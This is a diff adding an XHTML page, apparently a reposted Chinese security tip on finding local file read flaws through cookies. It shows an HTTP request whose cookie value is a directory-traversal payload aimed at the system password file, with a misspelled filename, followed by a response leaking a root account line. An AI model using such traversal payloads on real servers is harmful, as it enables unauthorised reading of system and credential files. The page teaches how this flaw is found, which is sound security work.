@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>如何根据cookie查找本地文件读取vuln</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>如何根据cookie查找本地文件读取vuln</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzAwMjQ2NTQ4Mg==&amp;mid=2247485362&amp;idx=3&amp;sn=b4c047690ff647c2391641bf37c2274c&amp;chksm=9acb4c17adbcc5014eaaceeb7a0ae4949cf75329f81c55f80adcc3d0c2d4ee2c9d322fcad91e&amp;scene=27#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzAwMjQ2NTQ4Mg==&amp;mid=2247485362&amp;idx=3&amp;sn=b4c047690ff647c2391641bf37c2274c&amp;chksm=9acb4c17adbcc5014eaaceeb7a0ae4949cf75329f81c55f80adcc3d0c2d4ee2c9d322fcad91e&amp;scene=27#wechat_redirect</a></blockquote><p data-mpa-powered-by="yiban.io"><br/></p><p>Request</p><p>GET /vulnerable.php HTTP/1.1</p><p>Cookie:usid=../../../../../../../../../../../../../etc/pasdwd</p><p><br/></p><p>Response</p><p>HTTP/1.1 200 OK </p><p>...</p><p>Server Apache 2.4 root:fi3sER6:0:1:System Operator:/:/bin/ksh//</p><p><br/></p><p><br/></p>
+        
+</body>
+</html>
